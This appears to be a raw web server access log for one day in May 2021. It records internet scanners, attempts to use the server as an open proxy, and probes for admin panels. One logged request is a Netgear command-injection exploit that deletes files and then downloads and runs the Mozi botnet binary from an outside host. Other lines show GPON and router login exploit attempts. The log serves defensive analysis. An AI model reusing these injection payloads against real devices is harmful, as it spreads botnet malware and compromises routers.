161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:55:42 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:01:56:01 +0000] "GET // HTTP/1.1" 200 1
205.185.127.244 - - [06/May/2021:01:58:54 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:02:09:52 +0000] "CONNECT graph.vshield.pro:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:11:41 +0000] "CONNECT trivesmm.xyz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:12:10 +0000] "CONNECT trivesmm.xyz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:12:20 +0000] "CONNECT trivesmm.xyz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:15:50 +0000] "CONNECT skribbl.io:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:16:13 +0000] "POST / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:02:18:09 +0000] "CONNECT lucifer.sb:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:30:49 +0000] "CONNECT blacklivesmatter.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:31:53 +0000] "CONNECT blacklivesmatter.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:02:33:15 +0000] "CONNECT blacklivesmatter.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:03:11:13 +0000] "CONNECT www.brianmichaelsjewelers.com:443 HTTP/1.1" 400 -
198.98.54.148 - - [06/May/2021:03:27:16 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [06/May/2021:03:39:13 +0000] "CONNECT demonstresser.net:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:03:39:52 +0000] "CONNECT demonstresser.net:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:03:42:10 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:03:42:58 +0000] "CONNECT demonstresser.net:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:03:43:15 +0000] "CONNECT demonstresser.net:443 HTTP/1.1" 400 -
123.4.15.218 - - [06/May/2021:03:51:47 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1096
123.4.15.218 - - [06/May/2021:03:51:47 +0000] "-" 400 -
161.129.155.154 - - [06/May/2021:03:55:57 +0000] "CONNECT thoibao.de:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:03:58:34 +0000] "CONNECT thoibao.de:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:04:02:03 +0000] "CONNECT thoibao.de:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:04:03:10 +0000] "CONNECT thoibao.de:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:04:05:58 +0000] "CONNECT gogoanime.city:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:04:06:45 +0000] "CONNECT gogoanime.city:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:04:07:32 +0000] "CONNECT gogoanime.city:443 HTTP/1.1" 400 -
185.193.127.225 - - [06/May/2021:04:08:38 +0000] "GET / HTTP/1.0" 200 1
167.248.133.39 - - [06/May/2021:04:29:50 +0000] "GET / HTTP/1.1" 200 1
167.248.133.39 - - [06/May/2021:04:29:50 +0000] "GET / HTTP/1.1" 200 1
92.112.37.173 - - [06/May/2021:05:03:00 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:05:18:15 +0000] "CONNECT addon.to:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:05:19:00 +0000] "CONNECT addon.to:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:05:23:26 +0000] "CONNECT addon.to:443 HTTP/1.1" 400 -
198.98.54.148 - - [06/May/2021:05:29:42 +0000] "GET /manager/html HTTP/1.1" 403 3503
64.62.197.2 - - [06/May/2021:05:35:29 +0000] "GET / HTTP/1.1" 200 1
205.185.120.245 - - [06/May/2021:05:38:55 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [06/May/2021:05:41:53 +0000] "CONNECT www.doordash.com:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:05:51:04 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:06:00:34 +0000] "CONNECT krunker.io:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:06:01:44 +0000] "CONNECT krunker.io:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:06:11:59 +0000] "CONNECT divinitysecurity.co:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:06:27:24 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:07:14:42 +0000] "CONNECT simbadev.glitch.me:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:07:23:25 +0000] "GET /script HTTP/1.1" 404 1080
198.98.54.148 - - [06/May/2021:07:34:52 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [06/May/2021:07:37:02 +0000] "CONNECT check-host.net:443 HTTP/1.1" 400 -
179.60.150.43 - - [06/May/2021:07:55:17 +0000] "GET / HTTP/1.1" 200 1
179.60.150.43 - - [06/May/2021:07:55:33 +0000] "GET /favicon.ico HTTP/1.1" 404 1085
179.60.150.43 - - [06/May/2021:07:55:35 +0000] "GET /robots.txt HTTP/1.1" 404 1084
206.166.251.147 - - [06/May/2021:08:39:08 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:09:11:20 +0000] "CONNECT www.playstation.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:09:11:25 +0000] "CONNECT www.playstation.com:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:09:14:27 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:09:15:51 +0000] "CONNECT www.rundfunkbeitrag.de:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:09:17:24 +0000] "CONNECT www.rundfunkbeitrag.de:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:09:20:06 +0000] "CONNECT www.rundfunkbeitrag.de:443 HTTP/1.1" 400 -
192.241.220.128 - - [06/May/2021:09:36:22 +0000] "GET /actuator/health HTTP/1.1" 404 1093
161.129.155.154 - - [06/May/2021:10:17:00 +0000] "CONNECT check-host.net:443 HTTP/1.1" 400 -
198.98.54.148 - - [06/May/2021:10:18:05 +0000] "GET /manager/html HTTP/1.1" 403 3503
206.166.251.147 - - [06/May/2021:10:38:51 +0000] "GET /script HTTP/1.1" 404 1080
192.241.214.29 - - [06/May/2021:10:49:03 +0000] "GET /hudson HTTP/1.1" 404 1080
148.251.132.8 - - [06/May/2021:10:55:15 +0000] "GET /tree? HTTP/1.1" 404 1078
206.166.251.147 - - [06/May/2021:10:59:40 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:11:03:30 +0000] "CONNECT henmeistermodz.xyz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:11:04:07 +0000] "CONNECT henmeistermodz.xyz:443 HTTP/1.1" 400 -
186.33.110.116 - - [06/May/2021:11:19:12 +0000] "GET / HTTP/1.1" 200 1
162.142.125.53 - - [06/May/2021:11:19:23 +0000] "GET / HTTP/1.1" 200 1
162.142.125.53 - - [06/May/2021:11:19:23 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:11:53:13 +0000] "CONNECT cycleforlanie.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:12:01:09 +0000] "CONNECT www.razer.com:443 HTTP/1.1" 400 -
205.185.120.245 - - [06/May/2021:12:01:23 +0000] "GET /manager/html HTTP/1.1" 403 3503
89.41.18.137 - - [06/May/2021:12:04:14 +0000] "GET / HTTP/1.1" 200 1
198.98.54.148 - - [06/May/2021:12:31:10 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [06/May/2021:13:09:30 +0000] "CONNECT awki.es:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:14:34:33 +0000] "CONNECT venmo.com:443 HTTP/1.1" 400 -
198.98.54.148 - - [06/May/2021:14:38:14 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [06/May/2021:14:54:27 +0000] "CONNECT realmstock.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:14:54:39 +0000] "CONNECT realmstock.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:14:56:26 +0000] "CONNECT realmstock.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:15:00:21 +0000] "CONNECT www.wix.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:15:00:44 +0000] "CONNECT realmstock.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:15:04:11 +0000] "CONNECT drama.gg:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:15:09:38 +0000] "CONNECT private-hosting.eu:443 HTTP/1.1" 400 -
205.185.122.102 - - [06/May/2021:15:35:31 +0000] "GET /config/getuser?index=0 HTTP/1.1" 404 1092
161.129.155.154 - - [06/May/2021:15:50:59 +0000] "CONNECT www.kerboodle.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:15:57:33 +0000] "CONNECT www.saltairfc.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:15:57:40 +0000] "CONNECT www.saltairfc.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:15:59:28 +0000] "CONNECT www.saltairfc.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:16:00:53 +0000] "CONNECT ddos.confighub.host:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:16:06:34 +0000] "CONNECT www.desmos.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:16:07:28 +0000] "CONNECT www.desmos.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:16:08:39 +0000] "CONNECT zestras.net:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:16:10:48 +0000] "CONNECT www.minecraft.net:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:16:13:04 +0000] "CONNECT health.gov:443 HTTP/1.1" 400 -
70.37.87.13 - - [06/May/2021:16:13:20 +0000] "GET /nifi/ HTTP/1.1" 404 1083
161.129.155.154 - - [06/May/2021:16:15:50 +0000] "CONNECT health.gov:443 HTTP/1.1" 400 -
69.92.67.34 - - [06/May/2021:16:18:05 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://69.92.67.34:34206/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 1083
45.79.204.46 - - [06/May/2021:16:27:09 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:16:27:41 +0000] "CONNECT suicidepreventionlifeline.org:443 HTTP/1.1" 400 -
198.98.54.148 - - [06/May/2021:16:45:05 +0000] "GET /manager/html HTTP/1.1" 403 3503
206.166.251.147 - - [06/May/2021:16:55:23 +0000] "GET /script HTTP/1.1" 404 1080
206.166.251.147 - - [06/May/2021:17:15:40 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:17:27:31 +0000] "CONNECT noahsmods.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:17:28:40 +0000] "CONNECT noahsmods.com:443 HTTP/1.1" 400 -
209.17.97.10 - - [06/May/2021:18:09:08 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:18:25:40 +0000] "CONNECT www.educake.co.uk:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:18:25:51 +0000] "CONNECT www.educake.co.uk:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:18:29:44 +0000] "CONNECT arma3.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:18:40:11 +0000] "CONNECT discord.gg:443 HTTP/1.1" 400 -
205.185.120.245 - - [06/May/2021:18:43:11 +0000] "GET /manager/html HTTP/1.1" 403 3503
198.98.54.148 - - [06/May/2021:18:49:16 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [06/May/2021:18:57:09 +0000] "CONNECT flowapi.cc:443 HTTP/1.1" 400 -
27.203.94.134 - - [06/May/2021:18:57:37 +0000] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 1096
27.203.94.134 - - [06/May/2021:18:57:37 +0000] "-" 400 -
161.129.155.154 - - [06/May/2021:19:02:39 +0000] "CONNECT rage.mp:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:06:17 +0000] "CONNECT portal.gov.cz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:06:25 +0000] "CONNECT portal.gov.cz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:06:53 +0000] "CONNECT portal.gov.cz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:07:06 +0000] "CONNECT portal.gov.cz:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:10:41 +0000] "CONNECT toothillschool.co.uk:443 HTTP/1.1" 400 -
23.129.64.204 - - [06/May/2021:19:10:48 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:19:12:25 +0000] "CONNECT bangenergy.com:443 HTTP/1.1" 400 -
128.1.248.42 - - [06/May/2021:19:14:25 +0000] "GET / HTTP/1.1" 200 1
128.1.248.42 - - [06/May/2021:19:14:26 +0000] "GET /webfig/ HTTP/1.1" 404 1085
161.129.155.154 - - [06/May/2021:19:16:27 +0000] "CONNECT bangenergy.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:18:02 +0000] "CONNECT shopmrbeast.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:18:59 +0000] "CONNECT bangenergy.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:21:39 +0000] "POST / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:19:25:16 +0000] "CONNECT www.bugatti.com:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:19:26:26 +0000] "GET /script HTTP/1.1" 404 1080
161.129.155.154 - - [06/May/2021:19:27:13 +0000] "CONNECT www.bugatti.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:27:35 +0000] "CONNECT www.bugatti.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:27:54 +0000] "CONNECT www.bugatti.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:28:43 +0000] "CONNECT toothillschool.co.uk:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:30:33 +0000] "CONNECT toothillschool.co.uk:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:19:53:31 +0000] "CONNECT www.cacareerzone.org:443 HTTP/1.1" 400 -
177.91.134.163 - - [06/May/2021:20:11:54 +0000] "GET / HTTP/1.0" 200 1
161.129.155.154 - - [06/May/2021:20:34:14 +0000] "CONNECT www.nike.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:20:39:32 +0000] "CONNECT cash.app:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:20:44:55 +0000] "CONNECT www.cghsnc.org:443 HTTP/1.1" 400 -
198.98.54.148 - - [06/May/2021:20:53:54 +0000] "GET /manager/html HTTP/1.1" 403 3503
23.90.145.37 - - [06/May/2021:20:54:38 +0000] "-" 400 -
23.90.145.37 - - [06/May/2021:20:54:39 +0000] "GET / HTTP/1.1" 200 1
23.90.145.37 - - [06/May/2021:20:54:40 +0000] "-" 400 -
23.90.145.37 - - [06/May/2021:20:54:41 +0000] "-" 400 -
23.90.145.37 - - [06/May/2021:20:54:42 +0000] "-" 400 -
23.90.145.37 - - [06/May/2021:20:54:43 +0000] "-" 400 -
23.90.145.37 - - [06/May/2021:20:54:43 +0000] "-" 400 -
23.90.145.37 - - [06/May/2021:20:54:45 +0000] "-" 400 -
92.118.161.57 - - [06/May/2021:21:26:50 +0000] "GET / HTTP/1.0" 200 1
161.129.155.154 - - [06/May/2021:21:58:40 +0000] "CONNECT reactselfbot.pro:443 HTTP/1.1" 400 -
178.72.78.125 - - [06/May/2021:22:09:05 +0000] "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0" 404 1105
161.129.155.154 - - [06/May/2021:22:20:38 +0000] "CONNECT cync.pro:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:22:23:01 +0000] "POST / HTTP/1.1" 200 1
41.186.74.194 - - [06/May/2021:22:31:47 +0000] "GET / HTTP/1.1" 200 1
161.129.155.154 - - [06/May/2021:22:35:28 +0000] "CONNECT www.southnottinghamshireacademy.org.uk:443 HTTP/1.1" 400 -
45.5.202.106 - - [06/May/2021:22:40:15 +0000] "GET / HTTP/1.1" 200 1
198.98.54.148 - - [06/May/2021:22:52:03 +0000] "GET /manager/html HTTP/1.1" 403 3503
161.129.155.154 - - [06/May/2021:23:13:44 +0000] "CONNECT eleniummods.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:23:15:05 +0000] "CONNECT eleniummods.com:443 HTTP/1.1" 400 -
209.17.96.202 - - [06/May/2021:23:20:01 +0000] "GET / HTTP/1.0" 200 1
161.129.155.154 - - [06/May/2021:23:21:32 +0000] "CONNECT hyperaim.gg:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:23:37:00 +0000] "CONNECT eleniummods.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:23:37:36 +0000] "CONNECT eleniummods.com:443 HTTP/1.1" 400 -
161.129.155.154 - - [06/May/2021:23:37:37 +0000] "CONNECT eleniummods.com:443 HTTP/1.1" 400 -
206.166.251.147 - - [06/May/2021:23:52:10 +0000] "GET /script HTTP/1.1" 404 1080
